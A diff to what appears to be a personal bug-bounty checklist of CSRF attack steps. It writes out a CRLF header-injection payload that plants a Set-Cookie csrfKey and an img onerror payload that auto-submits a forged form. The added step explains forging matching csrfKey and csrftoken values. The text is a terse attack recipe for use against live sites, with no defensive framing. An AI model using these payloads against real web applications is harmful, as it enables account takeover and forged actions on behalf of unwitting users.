@@ -263,7 +263,8 @@ login
          - open firefox and try to change email , intercept it and take token and drop the request and then make csrf poc
    5- if you found anything reflected in headers response then you can inject any other header with putting -> in the place         which is reflect  =hossamshady%0D%0ASet-Cookie: csrfKey=hossamshady1011393%3b SameSite=None"
    6- if you found key in cookies csrfkey search for anything reflected in response header and put in the place of autosubmit button of burpsuite csrf poc >> <img src="site.com/?parameterWhichIsRelfectingHeader=hossamshady%0D%0ASet-Cookie: csrfKey=yourCsrfWhichIsNotUsed%3b SameSite=None" onerror="document.forms[0].submit()"> this will submit poc and send csrfkey
-   
+
+  7- if csrftoekn and csrfkey are the same try to put fake csrf for both csrfkey and csrftoken if worked then make above attack with any csrftoken but same
    
    
    
